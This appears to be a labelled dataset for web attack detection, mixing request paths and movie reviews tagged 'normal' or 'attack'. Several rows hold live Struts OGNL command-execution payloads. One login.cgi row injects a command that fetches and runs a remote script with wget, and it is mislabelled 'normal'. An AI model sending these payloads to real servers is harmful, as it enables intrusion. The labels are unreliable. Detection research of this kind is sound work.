post,tags
/robots.txt,normal
/mt/blog/author/gamzatti/2017/04/,normal
/cgi-bin/mt/mt-cp.cgi?__mode=feed&_type=actions&blog_id=4&id=3,normal
/mt/know-how/,normal
"i was disappointed in this documentary.i thought it would be about the second chess match between Grandmaster Garry Kasporov and Deep Blue the supercomputer designed by IBM computer experts to beat any human chess player.Kasparov was and still is,considered the greatest chess player ever.the movie takes us back to 1997 where Kasporov had agreed to have a rematch with ""deep Blue"" after defeating it 1 year earlier.but instead of focusing on the game,it focuses more on what happens before and after.there are snippets of the game,but not very many.much of the film centers around Kasporov's paranoid obsession that the match was rigged as part of some conspiracy theory and that he lost the match unfairly.the movie also includes interviews with people who are not interesting in any way.they even chat with the manager of the building where the match took place.who cares?i also found it very dry and slow.ultimately this movie was unsatisfying.this is just my opinion,of course.if you like conspiracy theories,this movie might interest you.for people not into chess or conspiracy theories,this movie would probably have no value.i am a chess fan,and i only stuck it out because of that.i give""Game Over:Kasparov and the Machine"" 4/10",normal
"Thunder Alley finds Fabian banned from NASCAR tracks after causing the death of another driver. Stanley Adams might want to put him on his team of racers, but the other drivers aren't for having him around.<br /><br />Desperate for employment Fabian hooks up with an auto stunt show owner Jan Murray who's paying him peanuts and trying to capitalize on Fabian's bad rep. He's got to take it, but Annette Funicello who's Murray's daughter provides another reason to stick around.<br /><br />The rest of the film is Fabian's struggle to get back to the NASCAR circuit while at the same time juggling both Annette and his current girl friend Diane McBain. Personally, I would have taken McBain, she has it all over Annette.<br /><br />Thunder Alley is helped by location shooting at the southern NASCAR tracks and good film footage of NASCAR racing. Not helped by a rather silly story which delves into the real reason for Fabian's problems and his rather unrealistic recovery from same.<br /><br />Still fans of NASCAR might go for this.",normal
/mt/shatiku/2017/08/post-4.html,normal
"Excellent performances and a solid, but not overplayed story, helped this movie exceed my expectations. This movie was far better than I was expecting after some of the reviews I had read - but frankly those reviewers just got it wrong. Very inspiring and uplifting. Highly recommended!",normal
/mt/blog/1_frightmeal.jpg,normal
/phpmyadmin0/index.php,normal
/pmamy2/index.php,normal
/struts_chat/board/board.action?test=test,normal
/robots.txt,normal
/mt/know-how/mt.js,normal
/FCK/editor/js/fckeditorcode_ie.js,normal
"The title pretty much lets you know what you're getting. It's a grade-C howler but not as blatantly funny as I was hoping. Directed by exploitation film specialist Eddie Romero from a story that originally came from Jonathan Demme (long before directing ""Silence of the Lambs"" and ""Philadelphia""), this low-budget 1972 action movie was obviously filmed in the Philippines but set in some anonymous third world country. Playing hooker and small-time drug dealer Lee Daniels, blaxploitation superstar Pam Grier plays the first half of the title role, while long-forgotten Margaret Markov is the other half, Karen Brent, an unlikely Patty Hearst-like political revolutionary looking to partner with her comrades to overthrow the oppressive local government. Naturally antagonistic toward each other, they are in a women's prison camp where they wear inexplicably bright yellow mini-skirts as uniforms. Run by a closeted warden and lecherous matron, the prison is just an excuse for a lengthy shower scene and some half-hearted cat-fighting as Lee and Karen are pitted against each other. Of course, they escape but shackled together a la ""The Defiant Ones"" and continue the cat-fighting until they attack a couple of nuns to steal their habits.<br /><br />Meanwhile, various groups of unsavory men are in pursuit - the loutish drug lord looking for Lee who stole $40K from him, the rather passive revolutionaries looking for Karen, and the incompetent police (who suffer the humiliation of exposing their privates to the drug lord). Needless to say, everything eventually comes to a head but not before gratuitous nudity by a number of Filipino women, a dog wears Karen's panties and some of the worst of 1970's men's fashion (one beer-bellied revolutionary wears a leather halter top with a straight face). There is a rather sad ending, but what's truly sad is how much of the potential black comedy is missed entirely in this hilariously preposterous exercise. Sadly, Grier is disappointing in this outing because her character is not allowed much to do beyond dealing with all the ""jive"", while Markov is an Amazonian blonde whom I am convinced is trying desperately to be credible. Since no one displays any talent for acting, the rest of the cast is not worth noting, except balding, bug-eyed Sid Haig, who uses his standard psycho persona as the drug lord. The 2003 DVD contains only the original trailer as an extra.",normal
/phpmyadmin0/index.php,normal
/cgi-bin/mt/mt-search.cgi?search=php&IncludeBlogs=2&&SlEEp(3),normal
//myadmin/scripts/setup.php,normal
"Aparna Sen's 15 Park Avenue is a film about nature of reality. <br /><br />A young delusional girl, prone to imagining things and hearing voices, possibly out of sheer boredom, is taken to be schizophrenic by her educated father and control-freak educated elder step-sister. Controlled, pitied and treated like an invalid (even if out of love and affection), she has ghost of a chance to develop as a normal person. When a boy offers to marry her, her father and step-sister passionately try to convince him against taking such a step. A traumatic experience, caused primarily due to her sheltered existence, finally takes her across the line of no return, and she lives full time in a delusional world of her own. <br /><br />The family and society around her are intolerant of her delusions,and want to suppress them with medicines, electric shock therapy, anything, even though they all have delusions of one kind or other of their own. <br /><br />Her mother doesn't see the irony in allowing a ghost-buster to treat her of the delusions. Her step-sister is a professor of Physics, teaching among other things Quantum Mechanics, a subject in which a stream of experts accept parallel multi-universes and many more dimensions in space than the 3 we see. A friend recounts with admiration an experience with a holy person claiming to hear hallucinatory voices. Far away, George W Bush has real or fake delusions of Saddam's weapons of mass destruction, and is allowed to invade Iraq. <br /><br />As some viewers have already pointed out, Aparna Sen shied away from attacking the mother of all delusions -mainstream religions, which is a pity. <br /><br />In other words, accepted reality is what a majority or an influential minority believe in. That's been the case since the beginning, and lot more powerful people than Mithali in the film, among them Bruno and Galileo, have suffered as a consequence. <br /><br />The film's controversial and difficult ending was necessary to show it's a film about nature of reality, and not the case study of a schizophrenic girl. <br /><br />All the cast have given great performances, but Shabana Azmi and Konkona Sen Sharma have excelled. Aparna Sen has produced an outstanding philosophical film.",normal
/mt/know-how/archives.html,normal
/mt/blog/mt.js,normal
"/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=pwd",attack
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=touch /tmp/exploit",attack
/mt/mt-static/addons/Community.pack/themes/tristan-blue/header-menu-bg.png,normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/header.gif,normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=touch /tmp/exploit",attack
/mt/know-how/2017/02/entry.html,normal
/phpMyAdmin/index.php,normal
"This is a disaster-movie, in both meanings of the word. Every character, every role, every conversation, every twist, everything in this movie stinks big time. It's a shame to see Dennis Hopper's talent wasted in this dreadful movie. I can give you 100's of examples but see for yourself.<br /><br />Or rather : don't.",normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=touch /tmp/exploit",attack
/struts_chat/board/board.action?cat=,normal
"UK-born Australian helmer Alex Frayne calls for attention with his strange, necessitating a meticulous read, visually stunning Modern Love (2006). Following the steps of a man incapable of controlling a drastic personality change spurred by the death of a close relative pic offers a fascinating examination of human psychology. Distributed by Accent Film-Australia.<br /><br />John (Mark Constable), his wife Emily (Victoria Hill), and their son Edward (William Traeger) arrive in a small Southern town to take care of his deceased uncle's (Don Barker) property. While Emily and Edward check into a local hotel John begins to question the locals about Uncle Tom's death - some say that he committed suicide, some are unwilling to talk. Puzzled John comes up with a theory of his own - Uncle Tom is alive and well, hiding in the nearby bushes.<br /><br />If not for the occasional lines of dialog used to ease its heavy atmospheric tone Modern Love could have been easily mistaken for a Sokurov film. Shot with a 16mm camera its washed-out color scheme is strangely evocative of the Russian director's reflective forays into human agony. Perhaps it isn't a coincidence that it was at the Moscow International Film Festival where Modern Love had its premiere.<br /><br />Looking under the surface of this unique collage of intoxicating visuals however reveals a slightly different picture - while Sokurov's films tend to remain painfully intimate, to a point where they intentionally detach the main protagonists from the surrounding environment by blurring everything into a large splash of the director's preferred yellow, Modern Love very much feeds off the Australian countryside. John's gradual psychological transformation is dependent on it and the more the story progresses the more it becomes obvious that nature was an integral part of Frayne's vision.<br /><br />In Sokurov's The Second Circle a young man returns to the Russian countryside to bury his deceased father. In the shack where the old man once lived everything is covered with dust. He gathers the few old clothes scattered around and places the body of his father in a coffin. Then he bids goodbye and buries it. The rest of the film is a prolonged reflection on the collapse of the Soviet system, the loneliness and dissatisfaction many were left dealing with.<br /><br />In Modern Love, somewhat ironically, love is nowhere to be seen. On the contrary it is pain, loneliness, and dissatisfaction with ""modernity"" that suddenly invade John's life. Unlike The Second Circle however here the main protagonist has the opportunity to re-embrace his modern life. His wife and son await him, yet, he walks away. Slowly but surely the present begins to disintegrate under the weight of a somewhat confusing past.<br /><br />I doubt Frayne intended for Modern Love to be so strikingly similar to what Sokurov did in The Second Circle. Yet, the pacing, and in particular the puzzling framing, are precisely what transforms this film into a near meditative experience - a difficult and enormously brittle approach to deconstructing human psychology the two directors have mastered to perfection.<br /><br />Mark Constable delivers a top-notch performance as John adding even greater depth to his highly challenging character. His facial expressions are outstanding. Both Victoria Hill and William Traeger match perfectly with their performances pic's tense visual style.",normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=touch /tmp/exploit",attack
"Every time I watch this film, it just really makes me wanna go out and have a good night! My mate uses ""the weekend has landed"" speech to psyche himself up before going out! and so do I...sometimes. <br /><br />This film is a great debut for the writer/director - well done mate!<br /><br />The acting is great, all the characters are believable and are larger than life! The 'weird' scenes are a joy to watch, Jip's running Mr floppy flashbacks/explanations/visualizations are all great! The scene in the huuuuuuuge pub when everyone stands up and starts singing the mock national anthem is a laugh too. There's loads of comedy here - Howard Marks' 'spliff politics' speech is hilarious!<br /><br />Oh god, you just need to see this. Mind you, I felt the film did somewhat glorify the use of ecstacy, but hey, that's the truth of the matter eh? At least the film doesn't shy away from this fact. I suppose the film does carry a decent message to it as well - don't take life TOO seriously, you have to let you hair down sometime. And of course the chat in the pub when Moff tries to explain to his mates that he's coming off the drugs is a sure reminder that when the come down's out-way the good times, you know the party's over!<br /><br />This is at times a very clever film in it's use of the camera, lighting, etc. It was a realised piece of cinema, and a great feel-good tale of mates, love, clubs, and drugs.<br /><br />Get outta the 'rat race' people!!!<br /><br />8/10<br /><br />Enjoy!",normal
/tools/phpMyAdmin/index.php,normal
/PMA2/index.php,normal
"Acolytes presents an interesting mix of original concepts in ""screaming teen"" clichhorror with a more thriller-like pacing. In some ways Acolytes is very successful, but in many other ways the film fails miserably.<br /><br />Overall Acolytes avoided the typical archetypes of the naivety and innocence of youth of endless horror films in the like of Cabin Fever, Texas Chainsaw Massacre, and countless other films where unsuspecting and relatively naive and innocent teenagers, have sex, run around screaming and one-by-one are plucked off by some sort of monster. Instead this innocence is replaced with pride, retaliation, and arrogance. The characters had several opportunities to save themselves from immanent death and despair, but failed to do so due to their own personal demons. In the end you were left with the feeling that there were no (and perhaps are no) innocent victims.<br /><br />As the name implies, the film also touches greatly on following a leader or authority. This was used in a direct sense of if the main character would become like the serial killer and was also used less directly throughout the film. Following a central figure is a reoccurring theme throughout the film.<br /><br />Through all this, the film makers also incorporated a lot of clichャ which I suspect was intentional and gave the film a unique mixture of depth as well as shallowness which I found intriguing. This, perhaps inadvertently, plays well with the characters who are, at first appearance very shallow but as the story unfolds it becomes obvious that they are, at least the two main male characters, quite complex.<br /><br />Technically the film has a lot of problems however. The cinematography, which is typically regarded highly, I find rather sophomoric and over-stylized, utilizing formulaic 2/3 approaches far too rigidly. Many transitions I felt were also over-stylized. The use of symbolism was not only vague, but also greatly over used.<br /><br />The plot was poorly planned and relied exclusively on misinformation in order to achieve a rather hokey twist ending, which was poorly resolved and leaves viewers confused. Methods used to resolve the climax are cheap and ill-prepared, motivations are routinely unclear, and major plot points remain untied in the end.<br /><br />Overall, the film's relative originality, themes and thesis are lost in a maze of poor technical execution, over-stylized imagery, unclear motives, obtuse and unnecessary symbolism and cheap twists maintained only by a lack of or entirely incorrect information.<br /><br />If the film were better executed, it would have been excellent. However, Acolytes receives only two stars in my opinion.",normal
/phpmyadmin1/index.php,normal
/struts_chat/board/board.action,normal
"Alexander Lou, star of classics such as 'The Super Ninja' and 'Mafia vs Ninja' headlines here in this entertaining martial arts fest.<br /><br />The plot involves the evil Abbott White (who boasts some humongous and frankly somewhat scary looking white eyebrows) enlisting the aid of a ninja clan in order to overthrow the Shaolin Temple.<br /><br />This goal he achieves and furthermore wipes out most of it's members, although needless to say, one or two do manage to survive and rather predictably go on to exact eventual revenge upon the miscreant Abbott.<br /><br />....Ok so the plot isn't exactly pushing the envelope in terms of creativity but does anyone watching a film with a title like 'Wu Tang vs Ninja' aka 'The Ninja Hunter' really care much for such an inconsequential factor as a plot? Of course not! - It's the fights that matter in these films and by gum - you get your moneys worth here! There's some superbly choreographed martial arts on display from everyone involved in this and rarely a minute seems to goes by without a fight breaking out for some reason.<br /><br />If your at all into martial arts movies then this is a must see!",normal
/tools/phpMyAdmin/index.php,normal
/mt/blog/home.html,normal
/cgi-bin/mt/mt-cp.cgi?__mode=feed&_type=actions&blog_id=7&id=1,normal
/images/ASK_logo.gif,normal
"I have wracked my brain for another film that reminds me of this one. I really can't come up with one. I think it's because most of the films that take on this topic (war, peace, violence) are in a fixed documentary style.There are some terrific ones out there, all of them better known than USA T.M., I'm sure, but they are intended to be informational and to bring your emotional response to the surface through intellectual means. This DVD, in some ways may seem more intellectual but it really isn't. It is philosophical, maybe, but it bypasses the information mode and goes directly to the same place that a piece of music does. It makes you feel but sometimes you don't even know why. You are just taken somewhere on a wave of feeling. When you watch it, notice how well it is put together. It may not be for everyone but it is for everyone who look for a rare cinematic creation that respects you.",normal
"Reeves plays Haji Murad, a hero in 1850's Russia.<br /><br />This is a badly dubbed movie, with June Foray doing some of the voices. Unfortunately who ever was suppose to sync the voices to the lips was blind since the words never match the lip flaps. Anyone who says that Japanese films are bad have never watched this film.<br /><br />The film's plot is instantly forgettable and so I've forgotten it in the time its taken the movie to end and for me to sit and write this down. Perhaps it has more to do with the fact that the film is one of the many that Reeves made in hopes of moving away from action to more plot driven sort of films. It may have been a good thing for Reeves, but its deadly for the audience who have to slug through nooze fests such as this, where its all court intrigue with very little action.<br /><br />In Reeves defense, he was a good actor, he just had no real luck in picking films that were any good. They all looked great, but very few of them didn't put the those watching them into a coma for the film's running time.<br /><br />This film will put you in a coma. Watch it only if you have the need for sleep and all other gentler means have failed.",normal
"If you are a Christian or a Jew hoping to see an accurate Biblical (or Torah) portrayal of the events in Exodus, you will be disappointed by this movie. In typical Hollywood fashion people who are not even in the Bible have been ""created"" for supporting characters and play a large role in the movie. Jethro's role is changed completely and he becomes nothing but an untrusting father-in-law instead of a Shepherd priest who gave Moses excellent advise. God is largely removed from the movie, and instead viewers are given the impression that Moses had to figure things out for himself. Nothing could be further from the truth.<br /><br />This movie is a typical Humanistic twist on Biblical things and attempts to put most of the responsibility on Moses for trying to understand what God wants and what he should do. Those who know the book of Exodus well will see not only inconsistencies in the movie, but outright glaring changes to events. Most importantly, they will see a near total absence of God's dialog with Moses, which determines everything Moses does after the burning bush. Far from being alone as portrayed in the movie, Moses is guided by God with detailed and direct communication.<br /><br />Even Hallmark apparently can't acknowledge God's direct role, and without his spoken words to Moses many events make no sense. To compensate, Hallmark has actually changed some things. For instance, after the golden calf God plagues the people and they must look upon a symbol of a serpent to live. Hallmark creates a civil war instead and the Israelites pick sides, then slaughter each other. Moses side wins of course.<br /><br />There may be minimal value in this movie to unbelievers since it may cause them to seek answers, but believers should stay away. The twisted events and changes make this a danger to anyone who doesn't know their Bible. Read Exodus for yourself, there is no substitute.",normal
"Rainy day with not much to do. We were surfing the movie network channels and found this one just starting, so we gave it a chance.<br /><br />The more we watched, the more we became engrossed in the story. Its the old story of working class underdog trying to make it in a sport which at the time (1913 I think) was usually played by the wealthy upper class but this movie was every bit as interesting as Seabiscuit and this is also based on a true story.<br /><br />The acting is believable and the casting is brilliant. AND . . . . we are NOT golfers, so please don't miss this one just because its about golf. Any individual sport would serve the plot, because it's about the people. Golf works well for this story because of the class distinction and snobbery that seem to involve some who play the game.<br /><br />Bottom line . . . . Its a feel good movie. It's well put together and isn't it always fun to see those who think they are better than others get taken down a peg or two.",normal
"I have Never forgot this movie. All these years and it has remained in my life. I have looked for this movie on so many sites and stores. If anyone ever reads this and has a copy I will pay you for a copy of it or please let me know where I could find one. This is a movie that should be a Classic Romance known as well as my other favorite, Somewhere in Time. It was truly brilliant. If the right actors would remake this film and give it the Patience it needs, to be the Right acting, It could be a block buster.A Love story as powerful as this should be around for all lovers to see. I remember how sad I was at the ending and it really came as a shock. I believe with all my heart that Johnny really loved the woman and she him. This was one terrific movie and it is a shame that it is not available for us to purchase. Please contact me at shawe49@aol.com - I want to give my thanks to a wonderful lady that responded to my message almost a year later. She had a copy of the movie and was so kind to send it to me. She is a great fan of this movie as I am. With her help, there have been 3 happy ladies to receive these DVDs'. She is waiting for the book that it is based on. I am checking with my local library for it, titled 'Mrs Maitlands Affair, by Margarett Lynn. I am sure it is great also. Many thanks to Julie for her graciousness and friendship. I am your friend always,/ Sharon",normal
/phpmyadmin0/index.php,normal
/mt/shatiku/create-entry.html,normal
/phpmyadmin/index.php,normal
"When the first trailer for this film was viewed by myself, I was curious as to what angle the storyline would take. After all the plot of having one's childhood self return to the present leaves open many options. Bruce Willis however does a superb job in the role he was given. I was surprised to see just how well he could act in this part. This is also a good career move as many others have said but after seeing it I now agree. This film is mainly about remembering the kid you used to be, and coming to the realization that you aren't the adult you planned to be. This is a wonderful story and a gripping tale that makes us all think. Usually we scorn at ""What if..."" movies. For example, Waterworld attempted to answer the question ""What if the world were to be covered with water and...?"" But truthfully, nobody cared. This movie however effects everyone in the theatre. True, young children may not fully grasp the idea of growing up and having all your dreams fizzle away, but it leaves a great impact on the adults and parents of those children. This movie is definitely worth seeing. Although, it will be better the second time around because you won't be thinking so much (about how the kid got there, and why and all that stuff) Just relax and have fun. And take something with you when you leave that cinema. Take that piece of your childhood you've forgotten and enjoy it.",normal
"this movie scared the hell out of me for no good reason. the eerie music was well written but other than that, its a complete waste of time, and it REALLY disturbed me.... I'm not really sure why either.... if you just want to see a bad 'B' horror movie, i guess you could give it a shot, but only as a last resort",normal
/CuteSoft_Client/CuteEditor/Help/default.htm,normal
"The first season told pretty much how all elements of the Marine Corps would operate (i.e. ground, air, helicopters and jets) as a team. That's the season I give the high rating to! (True, there are still a lot of ""liberties"" taken in season 1, but the stories were more believable.)<br /><br />The subsequent seasons were a gawd-awful attempt of Melrose Place meets Top Gun! <br /><br />I was a Marine stationed at Miramar at the time and I remember them shooting the show around the San Diego area. I got to talk to Rod Rowland and James Brolin.<br /><br />Rowland's character was good to go.<br /><br />Brolin's character was good in the first season only. For some reason he slacked off after the first ep of the second season.<br /><br />If you want to see a LITTLE of how the Marine Air Ground team operates, then season one is the one to watch.<br /><br />If you're into Melrose Place and soap opera like plots with an attempt to merge them into Top Gun, then see the last two seasons.",normal
"The best Batman movie of the 90's no doubt about it. This movie takes place in a city filled with insecurity and nightmares.<br /><br />Although the villains are somewhat cheesy, they fit perfect for the movie's tone of colorful but nightmarish cinematography. <br /><br />The performances are really great and the comic tone behind them really delivers expectations. <br /><br />Don't get fooled by the cheesy outfits, this is a movie in the pure style of Burton. That can't be described; Burton is a sui generis director that took the Batman franchise to another obscure level but not forgetting about it's comic style past. <br /><br />Recommended for fans of action cinema and best of all, if it deals with super heroes.",normal
/mt/blog/,normal
/images/login_Name.jpg,normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=touch /tmp/exploit",attack
/phpMyAdminold/index.php,normal
/mt/prism/,normal
/mt/blog/2017/04/processes-of-suffering-or-struggling-for-something-are-never-be-vain-even-if-they-make-no-outputs.html,normal
/struts_chat/board/board.action,normal
"Compared to the recent gore flick HOSTEL, which this movie reminded me a lot of-- I would say that See No Evil is slightly better but not by much. The very complex plot involves a handful of delinquents who are sent to clean up a rundown hotel for a shorter jail sentence. The kids soon end up being killed off by a lumbering religious psychopath who is cleansing them of their sins (I guess). The one thing I dreaded most prior to seeing this was the fact that it stared a WWE wrestler, Kane. He ended up doing a decent job considering he only had 2 one-word lines in the movie. There are a couple fairly gory moments, mainly involving eye-gouging and a quite memorable scene in which a girl gets a cellphone shoved down her throat-- probably the most effective demise in the movie.<br /><br />I can't say that this movie really shows us anything new and is definitely far from great. Can't recommend it.",normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=pwd",attack
/mt/blog/home.html,normal
"This movie stinks majorly. The only reason I gave it a 3 was because the graphics were semi charming. It's total disregard for a plot and the lack of even insubstantial surface character development made it seem like just a bunch of nice drawings. This is by far THE worse anime that came out of Japan. I can't believe they actually put their names on this garbage. What a rip off selling this thing for $20. If you haven't seen this don't bother. If you have, I pity you.",normal
/mt/mt-static/addons/Community.pack/themes/tristan-blue/start-topic-icon.png,normal
"Heaven, Mary and all the Saints above! A young man has got super sperm, it's miracle bejesus, call the Pope, all you ladies out their desperate to get preggers, line up out side his door and drop your marks and sparks finest! Risible retro ealing comedy type comedy, trying to bring you a bit of the auld Irish charm. Has an effect like placing two fingers down your own throat, voamitus maximus! One out of ten!",normal
"/struts_chat/board/board.action?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),new java.lang.String=&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=pwd",attack
/login.cgi?cli=aa aa';wget http://185.62.190.191/r -O -> /tmp/r;sh /tmp/r'$,normal
/admin/index.php,normal
/themes/default/default.css,normal
"Firstly let me get this of my chest I hate Octopussy with an absolute passion. What is so frustrating is that it had so much potential and had a very good opening sequence, unfortunately post the opening sequence it all goes downhill. Firstly there was absolutely no plot to begin with, just an excuse for Moore to tell his corny jokes. Next there are several sequences that would make a Bond fan cringe,for instance the sequence in which Bond turns up to diffuse a bomb dressed as a clown. The villains are pretty poor, Louis Jordon fails to make an impact as Kamal Khan and Bollywood veteran Kabir Bedi is equally poor as his henchman. It's funny that when people debate over what the worst Bond movie is and Octopussy gets overlooked when it can easily give them a run for their money.",normal
"/cgi-bin/mt/mt-cp.cgi?__mode=score&blog_id=4&f=scored,count&jsonp=mtScore_cb&id=88",normal
"I was really surprised when I came across this movie on cable TV a couple of years ago. The story is a wonderful example of how our land keeps changing and the fight to hang on to it and use it according to need. Conflicting desires of ""the people"" and the Government. The actors were fantastic in their portrayals and I absolutely fell in love with Tantoo Cardinal-she is so believable and was such a character in this movie, as was Rip Torn. The story was also a love story about the land, the past, and between the 2 main characters. I have tried to buy this film and have been unable to locate it-but I would sure would love to own it.",normal
/mt/blog/2017/04/,normal
